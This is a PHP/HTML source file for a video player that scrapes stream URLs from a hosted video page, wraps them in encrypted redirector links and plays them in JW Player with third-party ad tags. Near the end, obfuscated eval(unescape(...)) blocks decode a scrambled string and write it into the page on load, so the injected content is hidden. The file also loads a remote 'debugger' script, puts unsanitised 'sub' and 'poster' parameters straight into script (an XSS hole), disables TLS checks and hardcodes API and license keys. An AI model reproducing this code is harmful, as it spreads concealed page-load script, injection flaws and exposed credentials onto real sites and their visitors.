<?PHP
header('X-Frame-Options: SAMEORIGIN');
?>
<?php
error_reporting(0);
function encrypte($string,$key){
    $returnString = "";
    $charsArray = str_split("e7NjchMCEGgTpsx3mKXbVPiAqn8DLzWo_6.tvwJQ-R0OUrSak954fd2FYyuH~1lIBZ");
    $charsLength = count($charsArray);
    $stringArray = str_split($string);
    $keyArray = str_split(hash('sha256',$key));
    $randomKeyArray = array();
    while(count($randomKeyArray) < $charsLength){
        $randomKeyArray[] = $charsArray[rand(0, $charsLength-1)];
    }
    for ($a = 0; $a < count($stringArray); $a++){
        $numeric = ord($stringArray[$a]) + ord($randomKeyArray[$a%$charsLength]);
        $returnString .= $charsArray[floor($numeric/$charsLength)];
        $returnString .= $charsArray[$numeric%$charsLength];
    }
    $randomKeyEnc = '';
    for ($a = 0; $a < $charsLength; $a++){
        $numeric = ord($randomKeyArray[$a]) + ord($keyArray[$a%count($keyArray)]);
        $randomKeyEnc .= $charsArray[floor($numeric/$charsLength)];
        $randomKeyEnc .= $charsArray[$numeric%$charsLength];
    }
    return $randomKeyEnc.hash('sha256',$string).$returnString;
}
function split_link($link) {
	$spilt = chunk_split($link, 500, "=");
	$array = explode('=', $spilt);
	foreach($array as $i => $data) {
		$list .= 'link'.($i+1).'='.$data.'&';
	}
	$split_link = rtrim($list, '&');
	return $split_link;
}
include "curl_gd.php";
require_once 'packer.php';
$domain_name = (isset($_SERVER['HTTPS']) ? "https" : "https") . "://" . $_SERVER['SERVER_NAME'] . dirname($_SERVER['PHP_SELF']);

if($_GET['url'] != ""){
	$url = $_GET['url'];
	$sub = $_GET['sub'];
	$poster = $_GET['poster'];
	$original_id = my_simple_crypt($url, 'd');
	$url = ''.$original_id.'';
	$url = $original_id;
	function curl($url){
		$ch = @curl_init();
		curl_setopt($ch, CURLOPT_URL, $url);
		$head[] = "Connection: keep-alive";
		$head[] = "Keep-Alive: 300";
		$head[] = "Accept-Charset: ISO-8859-1,utf-8;q=0.7,*;q=0.7";
		$head[] = "Accept-Language: en-us,en;q=0.5";
		curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2062.124 Safari/537.36');
		curl_setopt($ch, CURLOPT_HTTPHEADER, $head);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, FALSE);
		curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE);
		curl_setopt($ch, CURLOPT_TIMEOUT, 30);
		curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 30);
		curl_setopt($ch, CURLOPT_FOLLOWLOCATION, TRUE);
		curl_setopt($ch, CURLOPT_HTTPHEADER, array('Expect:'));
		$page = curl_exec($ch);
		curl_close($ch);
		return $page;
}
function cut_str($str, $left, $right){
	$str = substr(stristr($str, $left) , strlen($left));
	$leftLen = strlen(stristr($str, $right));
	$leftLen = $leftLen ? -($leftLen) : strlen($str);
	$str = substr($str, 0, $leftLen);
	return $str;
}
if(isset($url)){
	$curTemp = curl($url);
	$curTemp = cut_str($curTemp,'{"79468658":[[','"]');
	$curTemp = str_replace('\u003d','=', $curTemp);
	$curTemp = str_replace('\u0026','&', $curTemp);
	$curTemp = urldecode($curTemp);
	if ($curTemp <> "") {
		$curList = explode("&",$curTemp);
		foreach ($curList as $curl) {
		$curl = trim(substr($curl, strpos($curl,'https')-strlen($curl)));
			if ($curl <> "" ){
				if (strpos($curl,'itag=22') || strpos($curl,'=m22') !== false) {$v720p=$curl;}
				if (strpos($curl,'itag=22') || strpos($curl,'=m22') !== false) {$v480p=$curl;}
				if (strpos($curl,'itag=18') || strpos($curl,'=m18') !== false) {$v360p=$curl;}
			}
		}
	}
	}
	
	$file = '[{"file":"'.$domain_name.'/redirector.php?'.split_link(encrypte($v720p,'uplaycrypt')).'","label":"720p","type":"video\/mp4"}, {"file":"'.$domain_name.'/redirector.php?'.split_link(encrypte($v480p,'uplaycrypt')).'","label":"480p","type":"video\/mp4"},{"file":"'.$domain_name.'/redirector.php?'.split_link(encrypte($v360p,'uplaycrypt')).'","label":"360p","type":"video\/mp4","default":"true"}]';
}

?>
<!doctype html>
<html lang="en">
<head>
<meta charset="utf-8" />
<title>Google Photos Player</title>
<link rel="icon" href="https://cdn.staticaly.com/gh/domkiddie/drive/master/assets/img/favicon.png">
<meta name="referrer" content="never" /><meta name="referrer" content="no-referrer" />
<link rel='dns-prefetch' href='//cdn.statically.io' /><link rel='dns-prefetch' href='//lh3.googleusercontent.com' /><link rel='preconnect' href='//cdn.statically.io' />
<script type="text/javascript" src="https://cdn.statically.io/gh/karankankaria/JWPlayer/master/ufilestorage/a/master/jquery-2.2.3.min.js"></script>	
<style>body,html {background-color: #000;margin:0px;padding:0;width:100%;height:100%;border:none;}@-webkit-keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}@-moz-keyframes spin{0%{-moz-transform:rotate(0)}100%{-moz-transform:rotate(360deg)}}@keyframes spin{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.ancok-spinner{position:fixed;top:0;left:0;width:100%;height:100%;z-index:1003;background: #000000;overflow:hidden}  .ancok-spinner div:first-child{display:block;position:relative;left:50%;top:50%;width:150px;height:150px;margin:-75px 0 0 -75px;border-radius:50%;box-shadow:0 3px 3px 0 rgba(255,56,106,1);transform:translate3d(0,0,0);animation:spin 2s linear infinite}  .ancok-spinner div:first-child:after,.ancok-spinner div:first-child:before{content:'';position:absolute;border-radius:50%}  .ancok-spinner div:first-child:before{top:5px;left:5px;right:5px;bottom:5px;box-shadow:0 3px 3px 0 rgb(255, 228, 32);-webkit-animation:spin 3s linear infinite;animation:spin 3s linear infinite}  .ancok-spinner div:first-child:after{top:15px;left:15px;right:15px;bottom:15px;box-shadow:0 3px 3px 0 rgba(61, 175, 255,1);animation:spin 1.5s linear infinite}</style>
</head>
<body>
<div id="ancokplayer-loading-style" class="ancok-spinner"><div class="blob blob-0"></div><div class="blob blob-1"></div><div class="blob blob-2"></div><div class="blob blob-3"></div><div class="blob blob-4"></div><div class="blob blob-5"></div></div>
<?php
$result = '<script type="text/javascript" src="https://ssl.p.jwpcdn.com/player/v/8.17.3/jwplayer.js"></script>
<script type="text/javascript">jwplayer.key = "ITWMv7t88JGzI0xPwW8I0+LveiXX9SWbfdmt0ArUSyc=";</script>
<div id="ancok-player"></div>';
$data = 'var playerInstance = jwplayer("ancok-player");playerInstance.setup({sources:'.$file.',preload:"auto",primary:"html5",autostart:"false",playbackRateControls: [0.25, 0.5, 0.75, 1, 2, 3, 4],image:"'.$poster.'",width:"100%",height:"100%",tracks:[{file:"'.$sub.'",label:"English",kind:"captions"}],captions:{color:"#FFFF00",fontSize:15,edgeStyle:"uniform",backgroundOpacity:0,},aboutlink:"https://github.com/karankankaria/GDrive-X",abouttext:"My GDrive-X Player",sharing: {},advertising:{client:"vast",admessage:"This is an ad pod. This ad ends in xx seconds.",schedule:{adbreak1:{offset:"pre",tag:"https://vast.yomeno.xyz/?tcid=1539"},overlay:{offset:"5",tag: "overlay.xml",type:"nonlinear"},adbreak2:{ offset:"50%",tag:"https://vast.yomeno.xyz/?tcid=1539"},overlay:{offset:"5", tag:"overlay.xml",type:"nonlinear"}}}});playerInstance.on("error", function() { playerInstance = jwplayer("ancok-player"); playerInstance.setup({ width: "100%", height: "100%", autostart: false, sources:[{"file":"https://www.googleapis.com/drive/v3/files/1VstS11auX0pu8JPA6xz8FY-NOKu0Rus0?alt=media&key=AIzaSyDdoetN4aDmDBc6Y11CUGK4nhZ0pvZbXOw","type":"video/mp4","label":"360p", "default": "true"}],tracks:[{"file":"/","label":"English","kind":"captions","default":"true"}],logo: {file: ""}, abouttext: "My Grive-X Player", aboutlink: "https://github.com/karankankaria/GDrive-X", captions: { color: "#FFFF00", fontSize: 14, backgroundOpacity:0,edgeStyle:"uniform" }});});
';
$packer = new Packer($data, 'Normal', true, false, true);
$packed = $packer->pack();
$result .= '<script type="text/javascript">' . $packed . '</script>';
echo $result;
?>
<script type="text/javascript">
<!-- 
eval(unescape('%66%75%6e%63%74%69%6f%6e%20%67%34%35%35%34%38%28%73%29%20%7b%0a%09%76%61%72%20%72%20%3d%20%22%22%3b%0a%09%76%61%72%20%74%6d%70%20%3d%20%73%2e%73%70%6c%69%74%28%22%31%38%34%30%39%34%35%37%22%29%3b%0a%09%73%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%30%5d%29%3b%0a%09%6b%20%3d%20%75%6e%65%73%63%61%70%65%28%74%6d%70%5b%31%5d%20%2b%20%22%35%35%32%36%33%36%22%29%3b%0a%09%66%6f%72%28%20%76%61%72%20%69%20%3d%20%30%3b%20%69%20%3c%20%73%2e%6c%65%6e%67%74%68%3b%20%69%2b%2b%29%20%7b%0a%09%09%72%20%2b%3d%20%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%28%70%61%72%73%65%49%6e%74%28%6b%2e%63%68%61%72%41%74%28%69%25%6b%2e%6c%65%6e%67%74%68%29%29%5e%73%2e%63%68%61%72%43%6f%64%65%41%74%28%69%29%29%2b%33%29%3b%0a%09%7d%0a%09%72%65%74%75%72%6e%20%72%3b%0a%7d%0a'));
eval(unescape('%64%6f%63%75%6d%65%6e%74%2e%77%72%69%74%65%28%67%34%35%35%34%38%28%27') + '%3d%75%67%69%6f%68%73%3e%0f%05%75%5d%69%19%59%2a%73%57%66%33%2a%3f%5a%19%5a%73%2b%30%5e%73%39%28%5b%70%2a%37%5f%76%29%35%5c%72%29%3f%5c%77%31%3a%5b%73%33%2b%5d%70%28%2b%50%70%32%2a%5c%77%29%36%5f%71%35%37%5f%7c%2a%34%5c%70%36%39%5a%73%37%45%5e%73%26%28%5b%70%35%32%5f%76%29%46%5c%72%36%3d%5c%77%2a%30%5b%73%2c%32%5d%70%37%33%50%70%2d%31%5c%77%29%35%5f%71%31%46%5f%7c%35%2f%5c%70%2d%2b%5a%73%34%34%5e%73%26%30%5b%70%35%32%5f%76%29%44%5c%72%36%3f%5c%77%2a%33%5b%73%37%39%5d%70%37%36%50%70%2d%47%5c%77%36%37%5f%71%2a%32%5f%7c%2a%36%5c%70%32%33%5a%73%2b%31%5e%73%26%45%5b%70%35%34%5f%76%29%32%5c%72%32%48%5c%77%2a%34%5b%73%2c%44%5d%70%34%28%50%70%2d%47%5c%77%35%2c%5f%71%35%46%5f%7c%35%2f%5c%70%2d%33%5a%73%37%35%5e%73%26%33%5b%70%31%3d%5f%76%35%45%5c%72%29%24%5c%77%35%36%5b%73%33%47%5d%70%37%28%50%70%32%3a%5c%77%35%32%5f%71%2a%32%5f%7c%35%2d%5c%70%2d%33%5a%73%34%2b%5e%73%26%33%5b%70%2a%34%5f%76%32%3b%5c%72%36%3b%5c%77%2a%47%5b%73%30%34%5d%70%28%33%50%70%32%2a%5c%77%29%36%5f%71%35%29%5f%7c%2a%34%5c%70%2d%30%5a%73%30%44%5e%73%39%34%5b%70%2a%37%5f%76%36%2a%5c%72%29%49%5c%77%35%37%5b%73%2c%44%5d%70%34%35%50%70%2d%30%5c%77%36%2e%5f%71%2a%32%5f%7c%2a%34%5c%70%36%39%5a%73%34%34%5e%73%26%30%5b%70%35%31%5f%76%29%44%5c%72%35%3d%5c%77%2a%33%5b%73%33%39%5d%70%28%37%50%70%2d%30%5c%77%36%30%5f%71%2a%31%5f%7c%2a%40%5c%70%31%44%5a%73%2b%30%5e%73%26%33%5b%70%31%43%5f%76%29%44%5c%72%35%39%5c%77%2a%33%5b%73%2c%30%5d%70%33%47%50%70%32%3a%5c%77%29%32%5f%71%2a%45%5f%7c%36%2c%5c%70%2d%44%5a%73%37%30%5e%73%39%44%5b%70%35%2f%5f%76%29%31%5c%72%29%3f%5c%77%31%3a%5b%73%30%37%5d%70%28%33%50%70%32%2a%5c%77%29%36%5f%71%35%29%5f%7c%2a%34%5c%70%2d%30%5a%73%30%3a%5e%73%39%37%5b%70%2a%40%5f%76%35%36%5c%72%29%3c%5c%77%35%2a%5b%73%2c%33%5d%70%37%28%50%70%2d%33%5c%77%29%35%5f%71%35%38%5f%7c%35%33%5c%70%2d%33%5a%73%34%2b%5e%73%26%45%5b%70%36%36%5f%76%29%32%5c%72%32%48%5c%77%2a%34%5b%73%2c%33%5d%70%37%28%50%70%2d%33%5c%77%29%41%5f%71%36%44%5f%7c%2a%37%5c%70%2d%30%5a%73%30%44%5e%73%3d%44%5b%70%2a%34%5f%76%29%31%5c%72%32%24%5c%77%2a%33%5b%73%33%39%5d%70%28%37%50%70%2d%30%5c%77%32%2d%5f%71%2a%31%5f%7c%2a%40%5c%70%36%29%5a%73%2b%30%5e%73%39%28%5b%70%2a%37%5f%76%29%32%5c%72%32%36%5c%77%2a%34%5b%73%2c%33%5d%70%28%32%50%70%2d%35%5c%77%35%35%5f%71%2a%46%5f%7c%36%3c%5c%70%2d%32%5a%73%2b%33%5e%73%26%47%5b%70%36%2d%5f%76%29%31%5c%72%35%36%5c%77%2a%33%5b%73%33%39%5d%70%37%34%50%70%2d%47%5c%77%35%30%5f%71%2a%32%5f%7c%35%2f%5c%70%2d%33%5a%73%2b%33%5e%73%3d%3a%5b%70%2a%33%5f%76%29%31%5c%72%29%3d%5c%77%2a%35%5b%73%30%30%5d%70%28%47%50%70%31%3b%5c%77%29%37%5f%71%2a%31%5f%7c%2a%40%5c%70%31%33%5a%73%2b%30%5e%73%26%33%5b%70%31%43%5f%76%29%44%5c%72%35%36%5c%77%2a%33%5b%73%37%47%5d%70%28%30%50%70%32%3a%1a%2b%19%5a%73%30%45%18%2f%16%5c%77%31%35%5b%73%37%2b%5d%70%34%46%50%70%31%33%5c%77%32%32%19%2d%1a%5e%73%3a%36%5b%70%31%30%5f%76%35%46%5c%72%35%39%5c%77%31%34%5b%73%30%30%5d%70%34%45%50%70%31%47%5c%77%32%43%5f%71%31%36%5f%7c%36%37%5c%70%31%30%5a%73%30%35%5e%73%3d%45%5b%70%36%36%5f%76%35%36%5c%72%32%38%5c%77%37%34%5b%73%30%30%5d%70%34%47%50%70%31%37%5c%77%32%2c%5f%71%31%47%5f%7c%36%41%5c%70%31%29%5a%73%37%3b%5e%73%3d%45%5b%70%31%32%5f%76%35%36%5c%72%32%38%5c%77%37%34%5b%73%30%30%5d%70%34%47%50%70%31%37%5c%77%32%2c%5f%71%31%47%5f%7c%31%36%5c%70%31%30%5a%73%37%47%5e%73%3a%34%5b%70%36%41%5f%76%32%30%5c%72%32%49%5c%77%31%35%5b%73%30%34%5d%70%34%46%50%70%31%36%5c%77%32%43%5f%71%36%36%5f%7c%36%2c%5c%70%36%37%5a%73%37%2b%5e%73%3d%45%5b%70%31%32%5f%76%32%30%5c%72%35%38%5c%77%37%46%5b%73%37%37%5d%70%34%30%50%70%31%44%5c%77%35%31%5f%71%31%28%5f%7c%31%42%5c%70%36%37%5a%73%37%33%5e%73%3a%44%5b%70%36%30%5f%76%32%2b%5c%72%32%49%5c%77%36%36%5b%73%30%44%5d%70%33%46%50%70%36%35%5c%77%35%36%5f%71%36%44%5f%7c%31%36%5c%70%30%32%5a%73%37%33%5e%73%3d%34%5b%70%36%37%5f%76%37%35%5c%72%35%3b%5c%77%36%45%5b%73%30%28%5d%70%33%30%50%70%36%45%5c%77%35%32%5f%71%36%35%5f%7c%36%42%5c%70%31%28%5a%73%30%33%5e%73%3d%45%5b%70%36%34%5f%76%35%37%5c%72%32%49%5c%77%36%35%5b%73%30%46%5d%70%34%34%50%70%31%2b%5c%77%32%2c%5f%71%37%36%5f%7c%36%34%5c%70%31%47%5a%73%37%37%5e%73%3a%46%5b%70%31%30%5f%76%32%35%5c%72%32%49%5c%77%31%35%5b%73%30%34%5d%70%33%37%50%70%30%34%5c%77%35%35%5f%71%36%46%5f%7c%36%30%5c%70%31%45%5a%73%30%37%5e%73%3d%34%5b%70%31%42%5f%76%35%37%5c%72%35%27%5c%77%36%45%5b%73%37%36%5d%70%34%34%50%70%36%45%5c%77%35%36%5f%71%36%31%5f%7c%36%33%5c%70%31%34%5a%73%36%31%5e%73%3a%33%5b%70%31%33%5f%76%35%31%5c%72%37%38%5c%77%36%37%5b%73%30%46%5d%70%34%28%50%70%36%33%5c%77%32%43%5f%71%36%47%5f%7c%36%41%5c%70%31%28%5a%73%37%34%5e%73%3a%33%5b%70%36%40%5f%76%35%30%5c%72%32%49%5c%77%31%37%5b%73%37%2b%5d%70%34%46%50%70%31%2b%5c%77%32%35%5f%71%36%35%5f%7c%31%2d%5c%70%36%46%5a%73%34%37%5e%73%39%28%5b%70%35%2f%5f%76%36%29%5c%72%32%49%5c%77%31%2a%5b%73%30%34%5d%70%33%37%50%70%36%37%5c%77%32%2c%5f%71%36%45%5f%7c%31%42%5c%70%36%35%5a%73%37%2b%5e%73%3d%2a%5b%70%31%42%5f%76%32%34%5c%72%35%3c%5c%77%36%46%5b%73%37%32%5d%70%33%46%50%70%31%30%5c%77%35%35%5f%71%36%36%5f%7c%36%30%5c%70%36%46%5a%73%37%3b%5e%73%3b%2b%5b%70%31%30%5f%76%35%36%5c%72%32%26%5c%77%31%33%5b%73%37%46%5d%70%34%37%50%70%31%46%5c%77%35%33%5f%71%31%35%5f%7c%36%43%5c%70%31%34%5a%73%37%47%5e%73%3d%34%5b%70%31%42%5f%76%32%2b%5c%72%35%3b%5c%77%36%2b%5b%73%30%37%5d%70%33%30%16%2c%1d%5c%70%36%29%5a%73%37%37%5e%73%3d%28%5b%70%36%42%5f%76%35%2a%5c%72%35%39%5c%77%36%37%1d%2f%1c%19%2d%1a%5e%73%3b%45%5b%70%31%36%5f%76%29%3b%1a%2e%19%50%70%30%45%5c%77%35%2c%19%2d%1a%5e%73%3a%31%1d%5f%3d%60%75%5d%6f%21%66%75%6d%69%74%64%69%6e%27%5a%2e%73%64%66%32%34%7c%2b%2b%59%28%77%66%60%33%36%70%28%2f%55%28%77%65%66%37%34%76%36%2d%59%2a%73%69%66%37%37%70%33%2f%5f%2b%71%65%64%33%3b%70%30%2c%59%2f%73%63%65%31%37%72%35%2f%7d%5e%28%70%62%65%36%34%71%37%3d%1b%6a%77%69%65%74%64%6a%68%23%58%28%72%66%6a%30%30%70%35%24%7e%6c%64%75%77%68%6d%14%59%2f%70%65%61%33%31%73%34%2e%76%6a%59%74%6d%63%6e%66%23%5f%2b%71%65%64%33%3b%70%2d%23%7f%3a%60%60%23%1a%59%2a%73%57%66%33%2a%5d%30%5c%5b%5a%29%70%59%65%38%2a%5a%34%5f%58%23%2f%5d%28%2c%57%77%66%63%69%61%23%24%7e%77%63%62%6c%65%23%55%28%77%65%66%37%34%76%36%2e%2f%21%7e%55%28%77%65%66%37%34%76%35%5c%59%2a%73%69%66%37%37%70%30%23%5f%2b%71%65%64%33%3b%70%32%23%5f%38%1b%5f%2b%71%65%64%33%3b%70%33%5d%59%2f%73%63%65%31%37%72%36%53%7c%7b%18%59%2f%73%63%65%31%37%72%34%2c%59%2f%70%65%61%33%31%73%34%23%7d%3e%55%28%77%65%66%37%34%76%37%3e%18%5f%65%7b%6e%62%74%63%6e%6d%26%5a%29%70%67%65%3c%37%77%37%23%7a%69%61%77%76%6a%6c%1b%55%28%77%65%66%37%34%76%35%5c%59%2a%73%69%66%37%37%70%30%5c%79%5c%3c%59%2a%73%69%66%37%37%70%30%3c%1e%65%76%6e%67%77%6f%69%69%20%23%7a%69%61%77%76%6a%6c%1b%55%28%77%5b%66%33%29%5b%35%5e%7f%3f%5a%24%70%62%66%30%30%73%33%3c%19%2b%7d%3e%7d%60%64%6c%67%27%5a%2e%73%64%66%32%34%7c%35%28%2f%23%7a%60%60%23%58%28%72%66%6a%30%30%70%34%5a%5a%2e%73%64%66%32%34%7c%35%58%23%7d%5e%2b%76%66%67%30%35%73%27%3f%1f%59%28%77%66%60%33%36%70%29%5e%55%28%77%5b%66%33%29%5b%37%5e%5f%22%1b%62%67%76%18%4a%60%62%41%73%69%20%5b%2b%7c%5b%61%34%2a%5a%32%59%2e%19%59%2a%73%69%66%37%37%70%30%23%5f%2b%71%65%64%33%3b%70%32%23%2d%1f%5a%2e%73%5a%66%36%29%51%31%58%2c%59%2f%73%5d%65%35%2a%5f%33%53%23%2b%59%28%77%66%60%33%36%70%36%5e%55%28%77%65%66%37%34%76%36%5e%23%7d%7c%31%6a%60%74%77%6d%6d%1e%5a%29%70%67%65%3c%37%77%2b%7f%27%5a%2e%73%5a%66%36%29%51%28%58%2c%2a%37%2f%2c%33%2d%59%2a%73%57%66%33%2a%5d%32%5c%5b%5a%29%70%59%65%38%2a%5a%2a%5f%58%23%5f%2b%71%5b%64%37%26%5d%2c%5f%23%2b%2b%2a%7e%7e%23%21%0c%0e%3c%2e%75%65%6d%60%6e%77%3f18409457%34%35%37%36%39%35%32' + unescape('%27%29%29%3b'));
// -->
</script>
<noscript><i>Javascript required</i></noscript>
<script type="text/javascript">
   (function ($) {
  function getTimer(obj) {
    return obj.data("swd_timer");
  }

  function setTimer(obj, timer) {
    obj.data("swd_timer", timer);
  }

  $.fn.showWithDelay = function (delay) {
    var self = this;
    if (getTimer(this)) {
      window.clearTimeout(getTimer(this)); 
    }
    setTimer(this, window.setTimeout(function () {
      setTimer(self, false);
      $(self).show();
    }, delay));
  };
  $.fn.hideWithDelay = function () {

    if (getTimer(this)) {
      window.clearTimeout(getTimer(this));
      setTimer(this, false);
    }
    $(this).hide();
  }
})(jQuery);

$(document).ready(function () {
  $("#ancokplayer-loading-style").showWithDelay(0);
  
  window.setTimeout(function () {
    
    $("#ancokplayer-loading-style").hideWithDelay();
  }, 1000);

  
});</script>
<script src="https://cdn.statically.io/gh/karankankaria/JWPlayer/master/debugger.min.js" defer></script>
</body>
</html>
